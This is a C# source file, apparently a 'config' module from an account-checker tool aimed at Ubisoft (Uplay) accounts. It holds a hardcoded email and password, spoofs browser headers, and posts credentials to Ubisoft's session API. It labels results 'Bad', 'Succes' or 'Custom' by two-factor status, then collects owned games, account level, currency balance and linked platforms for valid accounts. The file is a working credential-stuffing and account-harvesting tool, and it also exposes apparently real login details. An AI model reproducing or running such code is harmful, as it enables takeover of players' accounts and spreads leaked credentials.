using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class Uplay
    {
        private static object send_data;

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        public static void uplay()
        {
            string email = "aljahir98@gmail.com";
            string pass = "AjMs310798";
            string B64Enc = Base64Encode(email + ":" + pass);

            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50");
                req.AddHeader("Pragma", "no-cache");
                req.AddHeader("Accept", "application/json");
                req.AddHeader("Authorization", "Basic " + B64Enc);
                req.AddHeader("Host", "public-ubiservices.ubi.com");
                req.AddHeader("Origin", "https://connect.ubisoft.com");
                req.AddHeader("Referer", "https://connect.ubisoft.com/");
                req.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                req.AddHeader("Ubi-RequestedPlatformType", "uplay");
                string payload = "{\"rememberMe\":true}";
                string send_data = req.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", payload, "application/json").ToString();
                Console.WriteLine(send_data);
                if (send_data.Contains("Invalid credentials") | send_data.Contains("Authentication forbidden because of suspicious activity"))
                {

                    Console.WriteLine("Bad");

                }
                else if (send_data.Contains("\"ticket\""))

                {

                    Console.WriteLine("Succes");
                    var nameon = Fox.Fuctions.Parsing.JSON(send_data, "nameOnPlatform");
                    string nameon2 = String.Join(", ", nameon);
                    var ticket = Fox.Fuctions.Parsing.JSON(send_data, "ticket");
                    string ticket2 = String.Join(", ", ticket);
                    var userid = Fox.Fuctions.Parsing.JSON(send_data, "userId");
                    string userid2 = String.Join(", ", userid);
                    var sesion = Fox.Fuctions.Parsing.JSON(send_data, "sessionId");
                    string sesion2 = String.Join(", ", sesion);

                    req.IgnoreProtocolErrors = true;
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("Authorization", "Ubi_v1 t=" + ticket2);
                    req.AddHeader("Host", "public-ubiservices.ubi.com");
                    req.AddHeader("Origin", "https://connect.ubisoft.com");
                    req.AddHeader("Referer", "https://connect.ubisoft.com/");
                    req.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                    req.AddHeader("Ubi-SessionId: " , sesion2);
                    send_data = req.Get("https://public-ubiservices.ubi.com/v3/profiles/me/2fa", null).ToString();



                    if (send_data.Contains("\"active\":true"))
                    {

                        Console.WriteLine("Custom");

                    }
                    else {

                        req.IgnoreProtocolErrors = true;
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("authorization", "Ubi_v1 t=" + ticket2);
                        req.AddHeader("origin", "https://ubisoftconnect.com");
                        req.AddHeader("referer", "https://ubisoftconnect.com/");
                  
                        req.AddHeader("sec-fetch-site", "cross-site");
                        req.AddHeader("ubi-appid", "314d4fef-e568-454a-ae06-43e3bece12a6");
                        req.AddHeader("ubi-localecode", "es-ES");
                        req.AddHeader("ubi-profileid", userid2);
                        req.AddHeader("ubi-sessionid", sesion2);
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69");
                        payload = "{\"operationName\":\"AllGames\",\"variables\":{\"limit\":null,\"owned\":false,\"latestReleasesMaxDate\":\"2021-07-26T05:59:11.870Z\"},\"query\":\"query AllGames($latestReleasesMaxDate: String!) {  viewer {    id    ...ownedGamesList    ...comingSoonGamesList    latestReleases: games(filterBy: {isOwned: false, game: {isReleased: true, releasedAfter: $latestReleasesMaxDate}}, orderBy: {field: RELEASE_DATE, direction: DESC}) {      totalCount      nodes {        ...gameProps        __typename      }      __typename    }    otherGames: games(filterBy: {isOwned: false, game: {isReleased: true, releasedBefore: $latestReleasesMaxDate}}, orderBy: {field: NAME, direction: ASC}) {      totalCount      nodes {        ...gameProps        __typename      }      __typename    }    __typename  }}fragment gameProps on Game {  id  spaceId  name  slug  coverUrl: lowBoxArtUrl  bannerUrl: backgroundUrl  releaseDate  releaseStatus  platform {    ...platformProps    __typename  }  __typename}fragment platformProps on Platform {  id  name  type  __typename}fragment ownedGameProps on Game {  ...gameProps  viewer {    meta {      id      isOwned      lastPlayedDate      lastPlayedOn {        ...platformProps        __typename      }      ownedPlatformGroups {        ...platformProps        __typename      }      ownedCrossplayPlatforms {        nodes {          ...platformProps          __typename        }        __typename      }      __typename    }    __typename  }  __typename}fragment ownedGamesList on User {  lastPlayedGames: games(limit: 2, filterBy: {isOwned: true}, orderBy: [{field: LAST_PLAYED_DATE, direction: DESC}]) {    totalCount    nodes {      ...ownedGameProps      isPeriodicChallengeSupported      viewer {        meta {          id          ...friendsPlayingGames          rewards {            purchasesCount            totalPurchasesCount            __typename          }          classicChallenges {            completedCount            totalCount            __typename          }          availablePeriodicChallenges: periodicChallenges(filterBy: {periodicChallenge: {isExpired: false}}) {            totalCount            __typename          }          completedPeriodicChallenges: periodicChallenges(filterBy: {isCompleted: true}) {            totalCount            __typename          }          __typename        }        __typename      }      __typename    }    __typename  }  ownedGames: games(offset: 2, filterBy: {isOwned: true}, orderBy: [{field: LAST_PLAYED_DATE, direction: DESC}]) {    totalCount    nodes {      ...ownedGameProps      __typename    }    __typename  }  __typename}fragment friendsPlayingGames on UserGameMeta {  friends {    edges {      node {        id        name        avatarUrl        networks {          edges {            node {              id              publicCodeName              __typename            }            meta {              id              name              __typename            }            __typename          }          __typename        }        __typename      }      meta {        id        lastPlayedDate        ownedCrossplayPlatforms {          nodes {            id            name            type            __typename          }          __typename        }        __typename      }      __typename    }    __typename  }  __typename}fragment comingSoonGamesList on User {  comingSoonGames: games(filterBy: {isOwned: false, game: {isReleased: false}}, orderBy: [{field: RELEASE_DATE}]) {    totalCount    nodes {      ...gameProps      facebookUrl      instagramUrl      redditUrl      twitterUrl      websiteUrl      __typename    }    __typename  }  __typename}\"}";
                        send_data = req.Post("https://public-ubiservices.ubi.com/v1/profiles/me/uplay/graphql", payload, "application/json").ToString();

                        var ownedGames = Fox.Fuctions.Parsing.LR(send_data, "ownedGames\":{\"totalCount\":", ",",true);
                        string ownedGames2 = String.Join(", ", ownedGames);
                        Console.WriteLine(ownedGames2);
                        var platformGames = Fox.Fuctions.Parsing.LR(send_data, "spaceId", "isOwned\":true");
                        string platformGames2 = String.Join(", ", platformGames);
                        var platformG = Fox.Fuctions.Parsing.LR(send_data, "slug\":\"", "\",\"coverUrl");
                        string platformG2 = String.Join(", ", platformG);



                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("authorization", "Ubi_v1 t=" + ticket2);
                        req.AddHeader("origin", "https://ubisoftconnect.com");
                        req.AddHeader("referer", "https://ubisoftconnect.com/");
                        
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "cross-site");
                        req.AddHeader("ubi-appid", "314d4fef-e568-454a-ae06-43e3bece12a6");
                        req.AddHeader("ubi-localecode", "es-ES");
                        req.AddHeader("ubi-profileid", userid2);
                        req.AddHeader("ubi-sessionid", sesion2);
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69");
                        payload = "{\"operationName\":\"userProfileMetrics\",\"variables\":{},\"query\":\"query userProfileMetrics {  viewer {    id    level    friends {      totalCount      __typename    }    unitsBalance    __typename  }}\"}";
                        send_data = req.Post("https://public-ubiservices.ubi.com/v1/profiles/me/uplay/graphql", payload, "application/json").ToString();




                        var accountLevel = Fox.Fuctions.Parsing.LR(send_data, "level\":", ",");
                        string accountLevel2 = String.Join(", ", accountLevel);
                        var unitsBalance = Fox.Fuctions.Parsing.LR(send_data, "unitsBalance\":", ",");
                        string unitsBalance2 = String.Join(", ", unitsBalance);



                        req.IgnoreProtocolErrors = true;
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Authorization", "Ubi_v1 t= " + ticket2);
                        req.AddHeader("Host", "public-ubiservices.ubi.com");
                        req.AddHeader("Origin", "https://connect.ubisoft.com");
                        req.AddHeader("Referer", "https://connect.ubisoft.com/");
                        req.AddHeader("Ubi-AppId", "c5393f10-7ac7-4b4f-90fa-21f8f3451a04");
                        req.AddHeader("ubi-profileid:", userid2);
                        req.AddHeader("Ubi-SessionId: ", sesion2);
                        send_data = req.Get("https://public-ubiservices.ubi.com/v3/users/ " + userid2 + "/initialProfiles", null).ToString();

                        var platformType = Fox.Fuctions.Parsing.JSON(send_data, "platformType",true);
                        string platformType2 = String.Join(", ", platformType);
                        string soynegro = platformType2.Replace("xbl", "XBOX");
                        Console.WriteLine(soynegro);
                        
                       

                    }






                }
                else if (send_data.Contains("twoFactorAuthenticationTicket\":\""))
                {


                    Console.WriteLine("Custom");
                }






            }

         


        }
    }
}
